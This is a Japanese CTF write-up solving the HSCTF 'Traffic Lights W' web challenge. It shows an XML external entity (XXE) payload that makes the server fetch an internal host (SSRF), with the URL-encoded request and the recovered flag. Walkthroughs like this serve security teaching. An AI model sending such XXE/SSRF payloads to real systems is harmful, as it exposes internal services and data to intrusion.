# Traffic Lights W

```
web traffic lights

🚦Can you figure out what's going on with this shady company?
https://traffic-light-w.web.hsctf.com/
Author: meow
```

<br>

## Solution

![1](https://user-images.githubusercontent.com/47602064/83937878-62910800-a80b-11ea-9e2d-b13eb7781b1a.png)

問題のページに移動すると`Traffic Light Dashboard`というページが標示されました。

グラフの下にある`Current Status`より`# 	Active 	Docker Hostname 	Port 	Firmware`という項目があります。

今`Action`が`True`なのは`#1001`と`#1004`の2つになります。

`#1001`の方の`Upload Firmware`を開いてみると以下のように標示されて`XML`コードが送れるそうです。

![2](https://user-images.githubusercontent.com/47602064/83939360-472bfa00-a817-11ea-9d47-6f5d030d5e22.png)

`Example: example`とあるので見てみると以下の内容でした。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<root>
  <content>Red</content>
</root>
```

これを試しに挿入してみると以下のように標示されました。

```
https://traffic-light-w.web.hsctf.com/firmware_upload.php?xml=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22ISO-8859-1%22%3F%3E%0D%0A%3Croot%3E%0D%0A++%3Ccontent%3ERed%3C%2Fcontent%3E%0D%0A%3C%2Froot%3E
```

![3](https://user-images.githubusercontent.com/47602064/83939407-b0ac0880-a817-11ea-85b9-d0dde1781846.png)

これで挿入したXMLが機能していることがわかりました。

<br>

これにより`XXE`が行える可能性があります。

次に`XXE`に埋め込んで`SSRF`が出来るようにします。

今回は2つが`Action`で`True`になっています。

なのでどちらかが使えそうです。

<br>

2つとも試したら、`#1004`が上手く実行できました。

以下の内容を`#1001`に送ります。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://traffic-light-1004">]>
<root>
  <content>&xxe;</content>
</root>
```
すると`XXE`に埋め込んだ`SSRF`により上手く実行されてflagが表示されました。

```
https://traffic-light-w.web.hsctf.com/firmware_upload.php?xml=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22ISO-8859-1%22%3F%3E%0D%0A%3C%21DOCTYPE+root+%5B%3C%21ENTITY+xxe+SYSTEM+%22http%3A%2F%2Ftraffic-light-1004%22%3E%5D%3E%0D%0A%3Croot%3E%0D%0A++%3Ccontent%3E%26xxe%3B%3C%2Fcontent%3E%0D%0A%3C%2Froot%3E
```

![4](https://user-images.githubusercontent.com/47602064/83939223-421a7b00-a816-11ea-8d99-85e0876ed8f7.png)


```txt
If you're reading this... You found out that the traffic lights are fake. Don't tell anyone. Here's a flag to make you happy: flag{shh_im_mining_bitcoin}
```

<br><br>

## FLAG: flag{shh_im_mining_bitcoin}
